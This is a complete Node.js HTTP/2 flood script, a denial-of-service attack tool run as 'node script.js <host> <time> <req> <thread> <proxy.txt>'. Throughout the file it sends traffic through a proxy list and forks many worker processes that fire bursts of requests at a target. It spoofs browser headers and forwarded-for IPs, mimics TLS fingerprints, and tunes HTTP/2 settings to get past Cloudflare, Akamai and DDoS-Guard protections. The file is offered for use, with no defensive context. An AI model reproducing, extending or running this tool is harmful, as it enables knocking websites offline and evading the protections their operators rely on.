const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com', 'youtube.com', 'facebook.com', 'baidu.com', 'wikipedia.org',
    'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
];

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length - 1)];
}

function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':');

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: node script.js <host> <time> <req> <thread> <proxy.txt>`);
    process.exit();
}

const secureProtocol = "TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
            proxy: {
                host: options.host,
                port: options.port,
                type: 5
            },
            command: 'connect',
            destination: {
                host: address[0],
                port: +address[1]
            }
        }, (error, info) => {
            if (error) {
                return callback(undefined, error);
            } else {
                return callback(info.socket, undefined);
            }
        });
    }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const lookupPromise = util.promisify(dns.lookup);
let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
        }
    } catch (error) {}
}

const targetURL = parsedTarget.host;
getIPAndISP(targetURL);

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + process.argv[2].white);
    console.log(`Time: `.blue + process.argv[3].white);
    console.log(`Rate: `.blue + process.argv[4].white);
    console.log(`Thread: `.blue + process.argv[5].white);
    console.log(`ProxyFile: `.blue + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1);
}

// Hàm generateHeaders và các hàm hỗ trợ đã sửa lỗi
const browsers = ["chrome", "safari", "firefox", "edge", "brave", "opera", "operagx", "duckduckgo", "mobile-chrome", "mobile-safari", "mobile-firefox"];
const platforms = {
    "chrome": ["Windows", "macOS", "Linux", "Android"],
    "safari": ["macOS", "iOS"],
    "firefox": ["Windows", "macOS", "Linux", "Android"],
    "edge": ["Windows", "macOS"],
    "brave": ["Windows", "macOS", "Linux"],
    "opera": ["Windows", "macOS", "Linux"],
    "operagx": ["Windows", "macOS"],
    "duckduckgo": ["Windows", "macOS", "Android"],
    "mobile-chrome": ["Android", "iOS"],
    "mobile-safari": ["iOS"],
    "mobile-firefox": ["Android", "iOS"]
};
const versions = {
    "chrome": { min: 120, max: 127 },
    "safari": { min: 17, max: 18 },
    "firefox": { min: 120, max: 130 },
    "edge": { min: 120, max: 127 },
    "brave": { min: 120, max: 127 },
    "opera": { min: 100, max: 110 },
    "operagx": { min: 100, max: 110 },
    "duckduckgo": { min: 7, max: 10 },
    "mobile-chrome": { min: 120, max: 127 },
    "mobile-safari": { min: 17, max: 18 },
    "mobile-firefox": { min: 120, max: 130 }
};
const referers = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
    "https://www.youtube.com/", "https://www.reddit.com/", "https://www.twitter.com/",
    "https://www.facebook.com/", "https://www.instagram.com/", "https://www.tiktok.com/",
    "https://www.linkedin.com/", "https://www.quora.com/", "https://news.ycombinator.com/",
    "https://www.wikipedia.org/", "https://www.amazon.com/", "https://www.ebay.com/"
];
const origins = [
    "https://www.google.com", "https://www.youtube.com", "https://www.reddit.com",
    "https://www.twitter.com", "https://www.facebook.com", "https://www.instagram.com",
    "https://www.tiktok.com", "https://www.linkedin.com", "https://www.amazon.com"
];

function getRandomBrowser() {
    const weights = {
        "chrome": 0.40, "mobile-chrome": 0.25, "safari": 0.15, "mobile-safari": 0.10,
        "firefox": 0.05, "mobile-firefox": 0.02, "edge": 0.01, "brave": 0.01,
        "opera": 0.005, "operagx": 0.005, "duckduckgo": 0.005
    };
    const total = Object.values(weights).reduce((a, b) => a + b, 0);
    const rand = Math.random() * total;
    let sum = 0;
    for (const browser in weights) {
        sum += weights[browser];
        if (rand <= sum) return browser;
    }
    return "chrome";
}

function generateHeaders(browser, parsedTarget) {
    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const platform = platforms[browser][Math.floor(Math.random() * platforms[browser].length)];
    const isMobile = browser.includes("mobile");
    const fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;

    const userAgents = {
        "chrome": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Linux; Android ${Math.floor(10 + Math.random() * 4)}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
        "safari": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}_1) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
        "firefox": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Android ${Math.floor(10 + Math.random() * 4)}; Mobile`}) Gecko/20100101 Firefox/${version}.0`,
        "edge": `Mozilla/5.0 (Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Edg/${fullVersion}`,
        "brave": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Brave/${version}`,
        "opera": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0`,
        "operagx": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64` : `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0 (Edition GX)`,
        "duckduckgo": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : `Linux; Android ${Math.floor(10 + Math.random() * 4)}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 DuckDuckGo/${version}`,
        "mobile-chrome": `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}; ${["Pixel", "Samsung", "Xiaomi", "OnePlus"][Math.floor(Math.random() * 4)]} ${Math.floor(6 + Math.random() * 4)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Mobile Safari/537.36`,
        "mobile-safari": `Mozilla/5.0 (iPhone; CPU iPhone OS ${Math.floor(15 + Math.random() * 3)}_0 like Mac OS X) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`,
        "mobile-firefox": `Mozilla/5.0 (Android ${Math.floor(10 + Math.random() * 4)}; Mobile; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`
    };

    const secChUa = {
        "chrome": `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
        "safari": `"Safari";v="${version}", "Not-A.Brand";v="99"`,
        "firefox": `"Firefox";v="${version}"`,
        "edge": `"Microsoft Edge";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
        "brave": `"Brave";v="${version}", "Chromium";v="${version}"`,
        "opera": `"Opera";v="${version}", "Chromium";v="${version}"`,
        "operagx": `"Opera GX";v="${version}", "Chromium";v="${version}"`,
        "duckduckgo": `"DuckDuckGo";v="${version}", "Chromium";v="${version}"`,
        "mobile-chrome": `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
        "mobile-safari": `"Safari";v="${version}", "Not-A.Brand";v="99"`,
        "mobile-firefox": `"Firefox";v="${version}"`
    };

    const platformVersions = {
        "Windows": ["10.0", "11.0"],
        "macOS": ["10.15.7", "11.6", "12.0", "13.0", "14.0"],
        "Linux": [undefined],
        "Android": ["10.0", "11.0", "12.0", "13.0", "14.0"],
        "iOS": ["15.0", "16.0", "17.0", "18.0"]
    };

    const architectures = ["x86", "arm64", "arm"];
    const acceptEncodings = ["gzip, deflate, br", "gzip, deflate, br, zstd", "gzip, deflate"];
    const acceptLanguages = [
        "en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9", "fr-FR,fr;q=0.8",
        "de-DE,de;q=0.7", "zh-CN,zh;q=0.8", "id-ID,id;q=0.9", "ja-JP,ja;q=0.8"
    ];
    const secFetchDests = ["document", "script", "image", "iframe", "empty"];
    const secFetchModes = ["navigate", "cors", "no-cors", "same-origin"];
    const secFetchSites = ["same-origin", "same-site", "cross-site", "none"];
    const cacheControls = ["no-cache", "max-age=0", "no-store, must-revalidate"];

    const headers = {
        ":method": Math.random() < 0.9 ? "GET" : "POST",
        ":authority": Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`,
        ":scheme": "https",
        ":path": parsedTarget.path || "/" + (Math.random() < 0.7 ? `?${generateRandomString(3, 8)}=${generateRandomString(5, 15)}` : ""),
        "sec-ch-ua": secChUa[browser],
        "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
        "sec-ch-ua-platform": `"${platform}"`,
        "sec-ch-ua-platform-version": platformVersions[platform][Math.floor(Math.random() * platformVersions[platform].length)] || undefined,
        "sec-ch-ua-arch": architectures[Math.floor(Math.random() * architectures.length)],
        "sec-ch-ua-full-version-list": `"${browser.replace("mobile-", "")}";v="${fullVersion}", "Not-A.Brand";v="99.0.0.0"`,
        "user-agent": userAgents[browser],
        "accept": Math.random() < 0.7 ? 
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" : 
            "application/json, text/plain, */*;q=0.8",
        "accept-encoding": acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)],
        "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
        "referer": referers[Math.floor(Math.random() * referers.length)],
        "origin": Math.random() < 0.7 ? origins[Math.floor(Math.random() * origins.length)] : undefined,
        "x-forwarded-for": Math.random() < 0.6 ? 
            `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` : 
            `2001:db8:${randstr(4)}:${randstr(4)}:${randstr(4)}:${randstr(4)}:${randstr(4)}:${randstr(4)}`,
        "sec-fetch-dest": secFetchDests[Math.floor(Math.random() * secFetchDests.length)],
        "sec-fetch-mode": secFetchModes[Math.floor(Math.random() * secFetchModes.length)],
        "sec-fetch-site": secFetchSites[Math.floor(Math.random() * secFetchSites.length)],
        "cache-control": cacheControls[Math.floor(Math.random() * cacheControls.length)],
        "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
        "dnt": Math.random() < 0.5 ? "1" : undefined
    };

    if (Math.random() < 0.3) {
        headers["cf-connecting-ip"] = headers["x-forwarded-for"];
    }
    if (Math.random() < 0.2) {
        headers["x-real-ip"] = headers["x-forwarded-for"];
    }
    if (Math.random() < 0.4) {
        headers[`x-${generateRandomString(4, 8)}`] = generateRandomString(5, 15);
    }
    if (Math.random() < 0.2) {
        headers[`cf-sec-${generateRandomString(3, 6)}`] = `${generateRandomString(5, 10)}-${generateRandomString(5, 10)}=${generateRandomString(5, 10)}`;
    }

    const shuffledHeaders = {};
    const keys = Object.keys(headers).sort(() => Math.random() - 0.5);
    keys.forEach(key => {
        if (headers[key] !== undefined) {
            shuffledHeaders[key] = headers[key];
        }
    });

    return shuffledHeaders;
}

function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    const maxi = getRandomInt(2, 3);
    for (let i = 1; i <= maxi; i++) {
        const key = 'cf-sec-' + generateRandomString(1, 9);
        const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
        doiTuong[key] = value;
    }
    return doiTuong;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
    const clength = randomElement(urihost);

    const browser = getRandomBrowser();
    const headers = generateHeaders(browser, parsedTarget);

    const headers4 = {
        ...(Math.random() < 0.4 && { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` }),
        ...(Math.random() < 0.75 && { "referer": "https://" + clength }),
        ...(Math.random() < 0.75 && {
            "origin": Math.random() < 0.5 ? 
                "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/') : 
                "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + clength
        }),
    };

    const dyn = {
        ...(Math.random() < 0.5 && { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }),
        ...(Math.random() < 0.5 && { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }),
    };

    const dyn2 = {
        ...(Math.random() < 0.5 && { "upgrade-insecure-requests": "1" }),
        ...(Math.random() < 0.5 && { "purpose": "prefetch" }),
        "RTT": "1"
    };

    const allHeaders = Object.assign({}, headers, headers4, dyn, dyn2, Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {});

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const settings = {
            initialWindowSize: 15663105,
        };

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);

        function generateJA3Fingerprint(socket) {
            const cipherInfo = socket.getCipher();
            const supportedVersions = socket.getProtocol();
            if (!cipherInfo) {
                console.error('Cipher info is not available. TLS handshake may not have completed.');
                return null;
            }
            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
            const md5Hash = crypto.createHash('md5');
            md5Hash.update(ja3String);
            return md5Hash.digest('hex');
        }

        tlsSocket.on('connect', () => {
            const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
        });

        function getSettingsBasedOnISP(isp) {
            const defaultSettings = {
                headerTableSize: 65536,
                initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
                maxHeaderListSize: 262144,
                enablePush: false,
                maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
                maxFrameSize: 16384,
                enableConnectProtocol: false,
            };

            const settings = { ...defaultSettings };

            if (isp === 'Cloudflare, Inc.') {
                settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
                settings.initialWindowSize = 65536;
                settings.maxFrameSize = 16384;
                settings.enableConnectProtocol = false;
            } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 65536;
                settings.maxFrameSize = 16777215;
                settings.maxConcurrentStreams = 128;
                settings.maxHeaderListSize = 4294967295;
            } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.maxConcurrentStreams = 100;
                settings.initialWindowSize = 6291456;
                settings.maxFrameSize = 16384;
                settings.maxHeaderListSize = 32768;
            } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 65535;
                settings.maxFrameSize = 16384;
                settings.maxConcurrentStreams = 100;
                settings.maxHeaderListSize = 4294967295;
            } else if (isp === 'Ddos-guard LTD') {
                settings.maxConcurrentStreams = 8;
                settings.initialWindowSize = 65535;
                settings.maxFrameSize = 16777215;
                settings.maxHeaderListSize = 262144;
            } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
                settings.maxConcurrentStreams = 100;
                settings.initialWindowSize = 65535;
                settings.maxHeaderListSize = 262144;
            } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 8388608;
                settings.maxFrameSize = 16384;
                settings.maxConcurrentStreams = 100;
                settings.maxHeaderListSize = 4294967295;
            } else if (isp === 'Google LLC') {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 1048576;
                settings.maxFrameSize = 16384;
                settings.maxConcurrentStreams = 100;
                settings.maxHeaderListSize = 137216;
            } else {
                settings.headerTableSize = 65535;
                settings.maxConcurrentStreams = 1000;
                settings.initialWindowSize = 6291456;
                settings.maxHeaderListSize = 261144;
                settings.maxFrameSize = 16384;
            }

            return settings;
        }

        let hpack = new HPACK();
        let client;
        const clients = [];
        client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: getSettingsBasedOnISP(isp),
            socket: tlsSocket,
        });
        clients.push(client);
        client.setMaxListeners(0);

        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });

        client.on('connect', () => {
            client.ping((err, duration, payload) => {});
            client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
        });

        clients.forEach(client => {
            const intervalId = setInterval(() => {
                async function sendRequests() {
                    const shuffleObject = (obj) => {
                        const keys = Object.keys(obj);
                        for (let i = keys.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [keys[i], keys[j]] = [keys[j], keys[i]];
                        }
                        const shuffledObj = {};
                        keys.forEach(key => shuffledObj[key] = obj[key]);
                        return shuffledObj;
                    };

                    const dynHeaders = shuffleObject({
                        ...dyn,
                        ...allHeaders,
                        ...dyn2,
                        ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
                    });

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(dynHeaders)
                    ]);

                    const streamId = 1;
                    const requests = [];
                    let count = 0;

                    const increaseRequestRate = async (client, dynHeaders, args) => {
                        if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                            for (let i = 0; i < args.Rate; i++) {
                                const requestPromise = new Promise((resolve, reject) => {
                                    const req = client.request(dynHeaders, {
                                        weight: Math.random() < 0.5 ? 251 : 231,
                                        depends_on: 0,
                                        exclusive: Math.random() < 0.5 ? true : false,
                                    })
                                    .on('response', response => {
                                        req.close(http2.constants.NO_ERROR);
                                        req.destroy();
                                        resolve();
                                    });
                                    req.on('end', () => {
                                        count++;
                                        if (count === args.time * args.Rate) {
                                            clearInterval(intervalId);
                                            client.close(http2.constants.NGHTTP2_CANCEL);
                                        }
                                        reject(new Error('Request timed out'));
                                    });

                                    req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                                });

                                const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                                requests.push({ requestPromise, frame });
                            }

                            await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                        }
                    }

                    await increaseRequestRate(client, dynHeaders, args);
                }

                sendRequests();
            }, 500);
        });

        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});